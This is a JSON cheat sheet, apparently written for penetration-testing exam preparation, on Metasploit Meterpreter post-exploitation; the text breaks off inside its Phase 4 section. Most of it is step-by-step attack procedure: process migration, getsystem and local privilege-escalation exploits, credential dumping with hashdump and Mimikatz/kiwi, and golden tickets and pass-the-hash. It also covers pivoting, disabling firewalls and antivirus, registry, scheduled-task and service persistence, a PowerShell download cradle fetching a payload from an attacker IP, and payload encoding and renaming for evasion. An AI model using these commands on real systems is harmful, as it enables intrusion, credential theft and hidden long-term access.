{
  "cheatsheets": [
    {
      "id": "metasploit-post-exploit",
      "name": "Metasploit Post-Exploitation - Meterpreter Operations",
      "description": "Comprehensive Meterpreter post-exploitation including system enumeration, privilege escalation, credential dumping, persistence mechanisms, and pivoting techniques for security work environments",
      "educational_header": {
        "how_to_recognize": [
          "Active Meterpreter session on compromised target (meterpreter> prompt)",
          "Need to escalate privileges from low-privilege user to SYSTEM/root",
          "Requirement to extract credentials (password hashes, plaintext passwords, Kerberos tickets)",
          "Multi-network environment requiring pivoting to internal subnets",
          "Need persistent access for long-term engagement or exam continuity",
          "Target is stepping stone to additional high-value systems"
        ],
        "when_to_look_for": [
          "Immediately after gaining initial Meterpreter session (system enumeration)",
          "When current user lacks privileges for critical files/operations (privilege escalation)",
          "After privilege escalation to SYSTEM/root (credential dumping for lateral movement)",
          "When nmap shows additional networks/interfaces on compromised host (pivoting setup)",
          "Before target reboot or session loss (persistence installation)",
          "When exam time is limited and session stability critical (migrate to stable process)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Initial Meterpreter Enumeration and Process Migration",
          "context": "Just gained Meterpreter session on Windows 10 target via web exploitation. Shell running as IIS APPPOOL\\DefaultAppPool (low privileges). Goal: Enumerate system, migrate to stable process, prepare for privilege escalation.",
          "approach": "Step 1: Check system info: sysinfo (OS version, architecture, domain membership). Step 2: Check current user: getuid (shows current privileges). Step 3: Check privileges: getprivs (look for SeImpersonatePrivilege, SeDebugPrivilege). Step 4: List running processes: ps (identify SYSTEM processes and stable applications). Step 5: Find stable process: ps | grep explorer.exe (Windows Explorer, usually PID <low number>, runs as user). Step 6: Migrate to stable process: migrate <PID> (move Meterpreter from vulnerable web process to Explorer). Step 7: Verify migration: getpid (should show new PID), getuid (check if privileges changed). Step 8: Background session for safety: background (Ctrl+Z).",
          "commands": [
            "meterpreter-sysinfo",
            "meterpreter-getuid",
            "meterpreter-getprivs",
            "meterpreter-ps",
            "meterpreter-migrate",
            "meterpreter-getpid"
          ],
          "expected_outcome": "sysinfo shows: 'Computer: WEB-SERVER-01, OS: Windows 10 (10.0 Build 19041), Architecture: x64, System Language: en_US, Domain: WORKGROUP'. getuid shows: 'Server username: IIS APPPOOL\\DefaultAppPool'. getprivs shows: 'SeChangeNotifyPrivilege, SeImpersonatePrivilege' (SeImpersonatePrivilege = Juicy Potato candidate). ps shows 50+ processes, including: 'explorer.exe (PID 1824, SYSTEM), svchost.exe (PID 856, SYSTEM), w3wp.exe (PID 3452, IIS APPPOOL) <- current process'. migrate 1824 shows: '[*] Migrating from 3452 to 1824, [*] Migration completed successfully'. New getuid still shows IIS APPPOOL (migration doesn't auto-escalate, just stabilizes). Time: 2-3 minutes for enumeration and migration. Why migrate: w3wp.exe may crash if web app restarted/patched, explorer.exe runs continuously (stable), Migration prevents session loss during post-exploitation. Common issues: Migration fails 'Access denied' (insufficient privileges, try different PID), Migrated process terminates (choose long-lived process: explorer, svchost).",
          "why_this_works": "Meterpreter process architecture: Runs as DLL injected in compromised process memory, Inherits privileges of host process (w3wp.exe runs as IIS APPPOOL), Vulnerable to process termination (web app restart kills Meterpreter). migrate command mechanics: 1) Allocates memory in target process (VirtualAllocEx), 2) Writes Meterpreter DLL to target process (WriteProcessMemory), 3) Creates remote thread in target (CreateRemoteThread), 4) New thread loads Meterpreter DLL, 5) Original Meterpreter exits gracefully. Process selection strategy: Stable processes: explorer.exe (user's desktop shell), svchost.exe (Windows services host), lsass.exe (Local Security Authority, SYSTEM privileges). Unstable processes: w3wp.exe (IIS worker, restarts frequently), apache2 (Linux web server), java (application servers). Target SYSTEM processes for privilege escalation: If current user is admin/SYSTEM, migration to SYSTEM process maintains privileges, If current user is low-privilege, migration to user-level process (explorer.exe) for stability. System enumeration commands: sysinfo provides: OS version (check for kernel exploits), Architecture (x86 vs x64 affects payload selection), Domain membership (AD environment or standalone), Installed hotfixes (via 'run post/windows/gather/enum_patches'). getprivs reveals: SeImpersonatePrivilege (Potato attacks: JuicyPotato, RoguePotato, PrintSpoofer), SeDebugPrivilege (dump LSASS memory for credentials), SeLoadDriverPrivilege (load malicious kernel driver for SYSTEM). pentest workflow: 1) Gain initial Meterpreter session (any user), 2) Enumerate (sysinfo, getuid, getprivs), 3) Migrate to stable process (explorer.exe for user-level, or defer until after privesc), 4) Escalate privileges if low-privilege (getsystem, exploit suggester), 5) Migrate to SYSTEM process after escalation (lsass.exe, svchost.exe), 6) Post-exploitation (hashdump, credential gathering). Common pitfalls: Migrating to SYSTEM process without SYSTEM privileges (fails with 'Access denied'), Choosing unstable PID (migrated process terminates, session lost), Not backgrounding session before running long tasks (blocks other operations). Troubleshooting: migration fails: Try different PID (some processes protected), Check current privileges: getprivs (need SeDebugPrivilege for some migrations), Use migrate -N <process_name> instead of PID: migrate -N explorer.exe (auto-finds PID). Session stability tips: Always migrate immediately after initial access, Use background before running post modules (avoids blocking), Run session -i -c 'migrate -N explorer.exe' -i 1 (automated migration from msfconsole)."
        },
        {
          "title": "Scenario 2: Windows Privilege Escalation with getsystem and Exploit Suggester",
          "context": "Meterpreter session as standard user (bob) on Windows 7 SP1 target. Need SYSTEM privileges to access SAM database and domain credentials. Goal: Escalate to SYSTEM using automated Meterpreter techniques.",
          "approach": "Step 1: Try automated privilege escalation: getsystem (attempts 3 techniques). Step 2: If getsystem fails, check available techniques: getsystem -h (shows technique list). Step 3: Try specific technique: getsystem -t 1 (Named Pipe Impersonation). Step 4: If all getsystem techniques fail, background session: background. Step 5: Run exploit suggester: use post/multi/recon/local_exploit_suggester; set SESSION 1; run. Step 6: Review suggested exploits (MS16-032, MS15-051, etc.). Step 7: Use suggested exploit: use exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION 1; set LHOST 192.168.45.5; run. Step 8: New SYSTEM session opens. Step 9: Verify escalation: getuid (should show NT AUTHORITY\\SYSTEM).",
          "commands": [
            "meterpreter-getsystem",
            "meterpreter-getuid",
            "msf-session-background"
          ],
          "expected_outcome": "getsystem shows: '[*] Trying technique 1 (Named Pipe Impersonation), [+] Success! New UID: NT AUTHORITY\\SYSTEM'. If successful, getuid confirms SYSTEM. If getsystem fails: '[*] Trying technique 1... Failed, [*] Trying technique 2... Failed, [*] Trying technique 3... Failed, [-] Could not escalate privileges'. Exploit suggester output: '[*] Collecting local exploit suggestions, [*] 10.10.10.50 - Vulnerable to: exploit/windows/local/ms16_032_secondary_logon_handle_privesc, [*] 10.10.10.50 - Vulnerable to: exploit/windows/local/ms15_051_client_copy_image'. Running suggested exploit: '[*] Started reverse TCP handler, [*] Launching notepad to host the exploit, [+] Process launched with PID 2340, [*] Meterpreter session 2 opened (SYSTEM privileges)'. Time: 10 seconds for getsystem (instant if successful), 2-5 minutes for exploit suggester + exploitation. Success rate: getsystem works on ~60% of Windows 7/Server 2008 targets with vulnerable configurations, Exploit suggester finds additional paths when getsystem fails. Common scenarios: getsystem succeeds: User has SeImpersonatePrivilege or SeDebugPrivilege (common on IIS, SQL Server accounts), getsystem fails but suggester finds kernel exploit: Unpatched Windows 7/8/Server 2008 (MS16-032, MS15-051, MS14-058).",
          "why_this_works": "getsystem techniques (3 built-in methods): Technique 1 (Named Pipe Impersonation): Creates named pipe with SYSTEM token, Tricks SYSTEM service (RPCSS) to connect, Impersonates SYSTEM token via ImpersonateNamedPipeClient API, Requires SeImpersonatePrivilege (common on service accounts). Technique 2 (Token Duplication): Finds SYSTEM process token, Duplicates token using DuplicateTokenEx API, Creates new process with SYSTEM token, Requires SeDebugPrivilege. Technique 3 (Named Pipe Impersonation - Variant): Alternative named pipe technique with different service targeting, Fallback if Technique 1 fails. Why getsystem may fail: Missing required privileges (neither SeImpersonate nor SeDebug), Windows 10 with recent patches (mitigations for token impersonation), Restricted process permissions (can't access SYSTEM process tokens). Exploit suggester workflow: Gathers system info: OS version (Windows 7 SP1 = many kernel exploits), Architecture (x86 vs x64), Installed hotfixes (checks for missing patches: wmic qfe list). Queries Metasploit database: Compares OS/hotfix data against known local exploits, Returns list of potentially successful exploit modules, Ranks by likelihood (reliability rank, patch status). Local privilege escalation exploits: MS16-032: Secondary Logon Handle Privilege Escalation (CVE-2016-0099), Affects: Windows 7/8/Server 2008/2012, Exploits: Insecure handle in Secondary Logon Service. MS15-051: Windows Client Copy Image Privilege Escalation (CVE-2015-1701), Affects: Windows Vista/7/8/Server 2003/2008, Exploits: Win32k.sys driver vulnerability. MS14-058: TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113), Affects: All Windows versions (pre-patch), Exploits: NULL pointer dereference in Win32k.sys. Automated workflow vs manual exploitation: getsystem: Instant (10 seconds), No system reboot, Works on misconfigured systems (common in labs). Exploit suggester + local exploit: 2-5 minutes, May require stable session (some exploits crash system), Works on unpatched systems (kernel vulnerabilities). pentest strategy: 1) Try getsystem first (fast, non-intrusive), 2) If fails, run exploit suggester (identify vulnerabilities), 3) Use suggested local exploit (MS16-032 most reliable for Windows 7), 4) Fallback: Manual enumeration (check for scheduled tasks, services, DLL hijacking). Privilege verification: getuid shows current user (NT AUTHORITY\\SYSTEM = success), getprivs shows all privileges: SeDebugPrivilege (dump LSASS), SeTcbPrivilege (act as OS), SeTakeOwnershipPrivilege (take file ownership). Post-escalation tasks: Dump credentials: hashdump (SAM database), load kiwi; creds_all (Mimikatz integration). Persistence: run persistence -X (registry run key), run metsvc (Meterpreter service). Lateral movement: Use dumped credentials with psexec, Pass-the-hash attacks. Troubleshooting: getsystem hangs: Incompatible with current process (migrate to different process first), Exploit suggester shows no results: System fully patched (try manual privesc: unquoted service paths, weak permissions), Exploit crashes system: Use more reliable exploit or manual techniques."
        },
        {
          "title": "Scenario 3: Credential Harvesting with Mimikatz and Kiwi",
          "context": "Escalated to SYSTEM on Windows 10 domain-joined target (CORP\\DC-01). Need credentials for lateral movement to other domain systems. Goal: Extract plaintext passwords, NTLM hashes, and Kerberos tickets.",
          "approach": "Step 1: Dump SAM database (local accounts): hashdump (extracts NTLM hashes from SAM). Step 2: Load Mimikatz extension: load kiwi (Meterpreter's Mimikatz integration). Step 3: Dump all credentials from memory: creds_all (plaintext passwords, hashes, tickets). Step 4: Alternative - specific credential types: creds_msv (NTLM), creds_kerberos (Kerberos tickets), creds_wdigest (plaintext if enabled). Step 5: Dump domain cached credentials: lsa_dump_sam, lsa_dump_secrets. Step 6: Golden ticket attack (if domain admin): golden_ticket_create -u administrator -d corp.local -k <KRBTGT_hash> -s <SID>. Step 7: Save credentials to file: creds_all > /root/creds.txt (from Meterpreter). Step 8: Use credentials for lateral movement: use exploit/windows/smb/psexec; set SMBUser administrator; set SMBPass <hash>; set RHOSTS <target>; run.",
          "commands": [
            "meterpreter-hashdump",
            "meterpreter-load-kiwi",
            "meterpreter-kiwi-creds-all"
          ],
          "expected_outcome": "hashdump shows: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::, Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::, bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::' (format: username:RID:LM hash:NTLM hash). load kiwi shows: '[*] Loading extension kiwi, [*] Success'. creds_all shows: 'msv credentials (NTLM hashes): bob / CORP / 64f12cddaa88057e06a81b54e73b949b, wdigest credentials (plaintext): Administrator / CORP / P@ssw0rd123!, kerberos credentials (TGT tickets): Administrator@CORP.LOCAL / krbtgt/CORP.LOCAL'. If plaintext passwords shown: WDigest enabled on older Windows (7/Server 2008) or manually enabled. If no plaintext: Windows 10/Server 2016+ (WDigest disabled by default). Time: 30 seconds for hashdump, 1-2 minutes for kiwi credential extraction. Credential types extracted: NTLM hashes (pass-the-hash attacks), Plaintext passwords (direct login), Kerberos TGT (pass-the-ticket, golden ticket attacks). Common use cases: Pass-the-hash: psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.45.101, Pass-the-ticket: kerberos::ptt <ticket.kirbi> (inject TGT for impersonation), Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt (offline cracking).",
          "why_this_works": "Windows credential storage locations: SAM database (Security Account Manager): Stores local account NTLM hashes (Administrator, Guest, local users), Located: C:\\Windows\\System32\\config\\SAM, Encrypted with SYSKEY (requires SYSTEM to decrypt), hashdump decrypts SAM and dumps hashes. LSASS process (Local Security Authority Subsystem Service): Stores credentials in memory for SSO (Single Sign-On), Contains: Plaintext passwords (if WDigest enabled), NTLM hashes (MSV authentication), Kerberos tickets (TGT, TGS for domain authentication), kiwi/Mimikatz dumps LSASS memory. LSA Secrets (Local Security Authority Secrets): Stores service account passwords, VPN credentials, auto-logon passwords, Domain computer account passwords, Cached domain credentials (last 10 domain logins). Hashdump internals: Reads SAM and SYSTEM registry hives, Decrypts SAM with SYSKEY from SYSTEM hive, Extracts NTLM hashes (format: username:RID:LM:NTLM:::), LM hashes usually 'aad3b435b51404eeaad3b435b51404ee' (disabled in modern Windows). Mimikatz/Kiwi functionality: Dumps LSASS process memory (requires SeDebugPrivilege = SYSTEM), Parses credential structures: MSV (NTLM hashes), WDigest (plaintext passwords, if enabled), Kerberos (TGT/TGS tickets), CredMan (saved credentials from Credential Manager). WDigest and plaintext passwords: Windows 7/Server 2008: WDigest enabled by default (stores plaintext in memory), Windows 8.1+/Server 2012+: WDigest disabled (no plaintext unless manually enabled), Force enable: reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 (requires reboot). Kerberos credential extraction: TGT (Ticket Granting Ticket): Valid for 10 hours (default), Used to request TGS (service tickets), Can be extracted and reused (pass-the-ticket attack). TGS (Ticket Granting Service): Service-specific ticket (SMB, HTTP, LDAP), Used for authentication to specific service, Extract with kiwi for targeted attacks. Golden Ticket: Forged TGT using KRBTGT account hash, Grants persistent domain admin access (valid until password change), Requires: Domain SID, KRBTGT NTLM hash, Target username. pentest workflow: 1) Gain SYSTEM on domain member, 2) hashdump for local accounts, 3) load kiwi; creds_all for domain credentials, 4) Save credentials to file for documentation, 5) Use credentials for lateral movement: psexec, winexe, crackmapexec, 6) Target domain controller next (replicate hashdump on DC for all domain hashes). Credential types and usage: NTLM hashes: Pass-the-hash attacks (no need to crack), SMB lateral movement: psexec.py -hashes :hash admin@target, RDP with Restricted Admin mode (if enabled). Plaintext passwords: Direct RDP/WinRM/SSH login, Spray across domain for additional access, Crack other hashes (password reuse). Kerberos tickets: Pass-the-ticket (inject TGT, impersonate user), Kerberoasting (extract service account TGS, crack offline), Golden ticket (persistent domain admin). Troubleshooting: hashdump fails 'Operation failed: Access denied': Not running as SYSTEM (run getsystem first), SAM file locked (reboot or use Volume Shadow Copy: vssadmin create shadow /for=C:). kiwi creds_all shows no passwords: WDigest disabled (Windows 10+), No interactive logons recently (credentials not cached in LSASS), Try alternative: lsa_dump_secrets (service account passwords). Mimikatz detected by AV: Use built-in hashdump (bypasses some AV), Disable AV temporarily: run killav (aggressive, noisy), Use alternative: procdump + offline Mimikatz (dump LSASS to file, analyze offline). OPSEC considerations: LSASS memory dump triggers EDR alerts (very suspicious), hashdump less noisy (reads registry, doesn't touch LSASS), kiwi/Mimikatz requires disable AV in many environments, Alternative stealth: Use native tools (reg save HKLM\\SAM sam.save; download sam.save; crack offline)."
        },
        {
          "title": "Scenario 4: Pivoting and Network Routing",
          "context": "Compromised web server (192.168.45.100) has two network interfaces: External (192.168.45.100/24), Internal (10.10.10.50/24). Internal network hosts domain controller (10.10.10.10) and file server (10.10.10.20). Goal: Route traffic through compromised host to access internal network.",
          "approach": "Step 1: Check network interfaces: ipconfig (Windows) or ifconfig (Linux). Step 2: Identify new subnet: 10.10.10.0/24 on eth1/Internal Adapter. Step 3: Add route to internal network: run autoroute -s 10.10.10.0/24 (Meterpreter auto-routing). Step 4: Verify route: run autoroute -p (print routing table). Step 5: Background session: background. Step 6: Use Metasploit modules against internal network: use auxiliary/scanner/portscan/tcp; set RHOSTS 10.10.10.0/24; set PORTS 445,3389,22; run (scan through pivot). Step 7: Exploit internal targets: use exploit/windows/smb/psexec; set RHOSTS 10.10.10.10; set SMBUser administrator; set SMBPass <hash>; run (session on internal DC). Step 8: Alternative - SOCKS proxy for external tools: use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 4a; run (start SOCKS server). Step 9: Configure proxychains: Edit /etc/proxychains4.conf, add 'socks4 127.0.0.1 1080'. Step 10: Use external tools through pivot: proxychains nmap -sT -Pn 10.10.10.10 (nmap via SOCKS).",
          "commands": [
            "meterpreter-ipconfig",
            "meterpreter-route-add",
            "msf-session-background"
          ],
          "expected_outcome": "ipconfig shows: 'Ethernet adapter Local Area Connection: IPv4 Address: 192.168.45.100, Subnet Mask: 255.255.255.0, Ethernet adapter Internal: IPv4 Address: 10.10.10.50, Subnet Mask: 255.255.255.0'. autoroute -s 10.10.10.0/24 shows: '[*] Adding route to 10.10.10.0/255.255.255.0 via session 1, [+] Route added'. autoroute -p shows: 'Active Routing Table: Subnet, Netmask, Gateway, 10.10.10.0, 255.255.255.0, Session 1'. Metasploit modules now route through pivot: tcp portscan shows 'Open ports: 10.10.10.10:445, 10.10.10.10:3389, 10.10.10.20:445'. psexec exploitation: '[*] Connecting to 10.10.10.10:445, [*] Meterpreter session 2 opened (to internal DC)'. SOCKS proxy: '[*] SOCKS proxy started on 127.0.0.1:1080'. proxychains nmap shows: 'ProxyChains-3.1 (http://proxychains.sf.net), [proxychains] Strict chain ... 127.0.0.1:1080 ... 10.10.10.10:445 <--socket connection, Nmap scan results for 10.10.10.10'. Time: 1-2 minutes to set up routing, instant access to internal network. Use cases: Metasploit modules (auxiliary, exploits) route automatically, External tools (nmap, enum4linux, smbclient) require SOCKS proxy. Common issues: Route not working: Check session still active (sessions -l), Verify subnet correct (autoroute -p), SOCKS proxy not proxying: Verify /etc/proxychains4.conf has correct port (1080), Use 'strict_chain' mode (fails if any proxy down).",
          "why_this_works": "Network pivoting necessity: Dual-homed hosts (multiple network interfaces) act as bridges, External attacker can't directly reach internal network (10.10.10.0/24), Compromised host has access to both networks, Pivot routes attacker traffic through compromised host. Meterpreter autoroute mechanics: Adds route entry to Metasploit routing table (not host routing table), Format: Subnet + Netmask + Session ID, Example: 10.10.10.0/24 via Session 1, All Metasploit traffic to 10.10.10.0/24 routed through Session 1. Traffic flow: 1) Metasploit module targets 10.10.10.10:445, 2) Metasploit checks routing table, finds 10.10.10.0/24 via Session 1, 3) Sends traffic to Meterpreter session on 192.168.45.100, 4) Meterpreter on compromised host forwards to 10.10.10.10:445, 5) Response returns via same path (reverse routing). SOCKS proxy integration: Metasploit SOCKS server listens on localhost:1080, External tools (nmap, curl, smbclient) configured to use SOCKS proxy, Proxy forwards tool traffic through Meterpreter session, Enables non-Metasploit tools to access internal network. proxychains configuration: /etc/proxychains4.conf contains proxy settings, strict_chain: All proxies must work (fails if one down), dynamic_chain: Skips dead proxies (more resilient), socks4/socks5: Protocol version (socks4a supports DNS through proxy). Use cases for each method: autoroute (Metasploit modules only): Fast (no external proxy needed), Limited to Metasploit modules (auxiliary, exploits, post), Automatic routing (no tool configuration). SOCKS proxy (external tools): Works with any SOCKS-aware tool (nmap, smbclient, browsers), Requires proxychains or manual SOCKS config, Slower (extra proxy hop), More versatile (use favorite tools). Port forwarding alternative: Local port forward: portfwd add -l 4445 -p 445 -r 10.10.10.10 (forward localhost:4445 to internal host 10.10.10.10:445), Access via localhost: smbclient //127.0.0.1:4445/C$ -U administrator (connects to internal SMB), Per-port setup (must forward each service individually). pentest pivoting workflow: 1) Compromise dual-homed host (web server, VPN endpoint), 2) Enumerate network interfaces (ipconfig, ifconfig), 3) Identify internal networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), 4) Add autoroute for each internal subnet, 5) Scan internal network via Metasploit: db_nmap -sT -Pn 10.10.10.0/24 (through pivot), 6) Exploit internal targets (psexec, EternalBlue, etc.), 7) Repeat pivoting on new internal hosts (multi-hop pivoting). Multi-hop pivoting: Session 1 on external host (192.168.45.100) \u2192 adds route to 10.10.10.0/24, Session 2 on internal host (10.10.10.50) \u2192 adds route to 172.16.0.0/24, Traffic flows: Attacker \u2192 Session 1 \u2192 Session 2 \u2192 172.16.0.5 (three-hop pivot). Advanced pivoting techniques: SSH tunneling (if SSH available): ssh -D 1080 user@192.168.45.100 (dynamic SOCKS), ssh -L 4445:10.10.10.10:445 user@192.168.45.100 (local port forward), Chisel (if no Meterpreter): Upload chisel binary, Run server/client mode for SOCKS proxy. Troubleshooting: autoroute traffic not routing: Firewall on pivot host blocking forwarding (disable: netsh advfirewall set allprofiles state off), Session died (routes invalidated, re-add after new session), SOCKS proxy timeouts: Increase timeout in proxychains.conf: tcp_read_time_out 15000, Use faster tools (Metasploit modules instead of nmap), nmap through SOCKS very slow: Use -T4 for faster scanning, Limit ports: -p 445,3389,22 (avoid full port scan), Use Metasploit's tcp portscan instead (much faster through pivot). OPSEC considerations: Traffic through pivot is encrypted (Meterpreter uses TLS), Internal firewall may still block scans (use stealthy techniques), Network monitoring may detect unusual internal traffic from pivot host (blend in with normal traffic patterns)."
        },
        {
          "title": "Scenario 5: Persistence Mechanisms for Long-Term Access",
          "context": "Gained SYSTEM on Windows domain controller. security assessment scenario requires 48-hour access. Need persistence in case of reboot, session loss, or AV detection. Goal: Install multiple persistence mechanisms for redundancy.",
          "approach": "Step 1: Registry Run Key persistence: run persistence -X -i 60 -p 443 -r 192.168.45.5 (creates registry entry + payload). Step 2: Scheduled task persistence: run schtasks -X -i 120 -p 4444 -r 192.168.45.5 (runs every 120 seconds). Step 3: Service-based persistence: upload /root/payload.exe C:\\Windows\\Temp\\svc.exe; shell; sc create PersistentSvc binPath= C:\\Windows\\Temp\\svc.exe start= auto; sc start PersistentSvc. Step 4: Set up listener for callbacks: use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; exploit -j -z. Step 5: Test persistence (optional): reboot target, wait for callbacks, sessions -l (should see new session after reboot). Step 6: Cleanup before exam end: run persistence -U (removes registry persistence), sc stop PersistentSvc; sc delete PersistentSvc (removes service).",
          "commands": [
            "meterpreter-upload",
            "meterpreter-shell",
            "msf-handler-background"
          ],
          "expected_outcome": "persistence -X shows: '[*] Creating persistent agent: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, [*] Persistent agent script written to C:\\Windows\\TEMP\\payload.vbs, [*] Persistence established, callbacks every reboot to 192.168.45.5:443'. schtasks -X shows: '[*] Creating scheduled task to run every 120 seconds, [*] Task created: \\Windows\\System\\Maintenance'. Service creation: 'SC CreateService SUCCESS'. Handler receives callbacks: '[*] Meterpreter session 3 opened' (after reboot or interval). Time: 5-10 minutes to set up multiple persistence methods. Redundancy: If registry persistence detected/removed, scheduled task provides backup, If AV kills payload, service restarts it. Common issues: Persistence payload detected by AV (encode payload: msfvenom -e x86/shikata_ga_nai -i 5), Target reboots and no callback (firewall blocking outbound, verify LHOST/LPORT), Cleanup fails (manual removal: reg delete HKLM\\...\\Run /v payload /f; schtasks /delete /tn ...).",
          "why_this_works": "Persistence necessity: Meterpreter sessions are volatile (lost on reboot, network disruption, process termination), security assessment: 48-hour duration, need access continuity, Real engagements: Long-term access for data exfiltration, monitoring. Persistence methods overview: Registry Run Keys: Payload executes on user logon or system boot, Location: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (system-wide), HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (user-specific), Execution trigger: User logon (for HKCU), System boot (for HKLM with SYSTEM privileges). Scheduled Tasks: Payload executes at intervals (every 60/120 seconds) or specific times, Location: Task Scheduler (\\Windows\\System\\...), Execution trigger: Time-based (interval or schedule), Stealthier (can use obscure task names). Windows Services: Payload runs as background service, Location: Services (sc query shows registered services), Execution trigger: System boot (if start=auto), Persistent across reboots, runs with SYSTEM privileges. Startup Folder: Payload copied to startup directory, Location: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup, Execution trigger: User logon. Registry Run Key mechanics (persistence -X): Creates VBS dropper script (downloads payload via HTTP), Adds registry entry: HKLM\\...\\Run = 'wscript C:\\Windows\\TEMP\\payload.vbs', On boot/logon: wscript executes VBS, VBS downloads Meterpreter payload from attacker, Payload connects back to handler. Scheduled Task mechanics (schtasks -X): Creates scheduled task with schtasks command, Task triggers every X seconds (configurable with -i option), Executes payload: powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://192.168.45.5/payload'))\" (PowerShell download cradle), Payload executes in memory (no disk write if using downloadstring). Service-based persistence: Upload payload to target: upload payload.exe C:\\Windows\\Temp\\svc.exe, Create service: sc create PersistentSvc binPath= \"C:\\Windows\\Temp\\svc.exe\" start= auto, Start service: sc start PersistentSvc, Service runs payload with SYSTEM privileges, Restarts on boot (start=auto). Handler requirements: Must use ExitOnSession false (catch multiple callbacks without handler stopping), Use background job: exploit -j -z (allows continued work while handler listens), Multiple handlers: Set up handlers on different ports for each persistence method (443 for registry, 4444 for schtasks, etc.). security assessment strategy: Set up persistence immediately after gaining SYSTEM on critical box (domain controller), Use multiple methods for redundancy (registry + schtasks + service), Test callbacks before relying on persistence (reboot in lab environment), Document persistence locations (needed for cleanup and reporting), Remove all persistence before exam end (part of rules, avoid points deduction). Cleanup commands: Registry: run persistence -U (automated), Manual: reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <name> /f. Scheduled Task: schtasks /delete /tn <task_name> /f. Service: sc stop <service_name>; sc delete <service_name>. Stealth considerations: Avoid obvious names: 'payload.exe' \u2192 'svchost.exe' (blend with legitimate), Use Windows directories: C:\\Windows\\System32 (less suspicious than C:\\Temp), Obfuscate registry values: 'Meterpreter' \u2192 'Windows Update Service'. AV evasion for persistence payloads: Encode payload: msfvenom -e x86/shikata_ga_nai -i 5 -p windows/meterpreter/reverse_tcp, Use PowerShell download cradle (downloads payload from attacker server, executes in memory), Alternative: DLL hijacking (replace legitimate DLL with malicious one, harder to detect). Troubleshooting: Callbacks stop after reboot: Firewall rule blocking outbound (add rule: netsh advfirewall firewall add rule ...), Payload deleted by AV (whitelist path or use encoded payload), Handler not running (start background handler first). Persistence not triggering: Registry Run key requires reboot/logon (wait or force reboot), Scheduled task disabled (check task status: schtasks /query /tn <name>), Service failed to start (check logs: eventvwr, Application logs). Alternative persistence methods (advanced): WMI Event Subscription: Payload triggers on WMI events (user logon, process creation), Stealthy (not in registry or Task Scheduler), Difficult to detect and remove. Logon Scripts: GPO or local logon scripts execute payload, Requires domain admin for GPO, Local scripts in C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. DLL Hijacking: Replace legitimate DLL with malicious one (e.g., DLL in application directory), Application loads malicious DLL on startup, Very stealthy (blends with legitimate processes)."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)",
          "notes": "Immediately after gaining Meterpreter session, enumerate system: sysinfo (OS, arch, domain), getuid (current user), getprivs (privileges), ps (running processes). Migrate to stable process: migrate <explorer.exe PID> (prevents session loss). Background session: background (or Ctrl+Z). Estimated time: 2-3 minutes.",
          "commands": [
            {
              "id": "meterpreter-sysinfo",
              "example": "sysinfo",
              "shows": "Computer name displayed"
            },
            {
              "id": "meterpreter-getuid",
              "example": "getuid",
              "shows": "Server username displayed (DOMAIN\\user format on Windows)"
            },
            {
              "id": "meterpreter-getprivs",
              "example": "getprivs",
              "shows": "Enabled Process Privileges list"
            },
            {
              "id": "meterpreter-ps",
              "example": "ps",
              "shows": "Process list with columns: PID, PPID, Name, Arch, Session..."
            },
            {
              "id": "meterpreter-migrate",
              "example": "migrate 1234",
              "shows": "Migrating from <OLD_PID> to <NEW_PID>"
            }
          ]
        },
        {
          "title": "Phase 2: Privilege Escalation (If Not Already SYSTEM)",
          "notes": "Try automated escalation: getsystem (3 techniques). If fails, background session and run exploit suggester: use post/multi/recon/local_exploit_suggester; set SESSION 1; run. Use suggested exploits (MS16-032, MS15-051). Verify escalation: getuid (should show SYSTEM). Estimated time: 1-5 minutes (instant if getsystem works, longer for exploit suggester).",
          "commands": [
            {
              "id": "meterpreter-getsystem",
              "example": "getsystem",
              "shows": "got system via technique N"
            },
            {
              "id": "meterpreter-getuid",
              "example": "getuid",
              "shows": "Server username displayed (DOMAIN\\user format on Windows)"
            }
          ]
        },
        {
          "title": "Phase 3: Credential Harvesting (Post-Escalation)",
          "notes": "Dump local hashes: hashdump (SAM database). Load Mimikatz: load kiwi. Extract all credentials: creds_all (plaintext, hashes, tickets). Dump LSA secrets: lsa_dump_secrets (service accounts, cached creds). Save to file: creds_all > /root/creds_<target>.txt. Use for lateral movement. Estimated time: 2-5 minutes.",
          "commands": [
            {
              "id": "meterpreter-hashdump",
              "example": "hashdump",
              "shows": "Username:RID:LM_hash:NTLM_hash::: format"
            },
            {
              "id": "meterpreter-load-kiwi",
              "example": "load kiwi",
              "shows": "Mimikatz ASCII art displayed"
            },
            {
              "id": "meterpreter-kiwi-creds-all",
              "example": "creds_all",
              "shows": "Credentials table with Username, Domain, NTLM, SHA1"
            }
          ]
        },
        {
          "title": "Phase 4: Pivoting Setup (Multi-Network Environments)",
          "notes": "Check network interfaces: ipconfig/ifconfig (identify additional subnets). Add routes: run autoroute -s <subnet>/24 for each internal network. Verify routes: run autoroute -p. Background session. Scan internal network: use auxiliary/scanner/portscan/tcp; set RHOSTS <internal_subnet>; run. For external tools: Set up SOCKS proxy: use auxiliary/server/socks_proxy; set SRVPORT 1080; run. Configure proxychains, use tools via proxychains. Estimated time: 3-5 minutes for routing setup.",
          "commands": [
            {
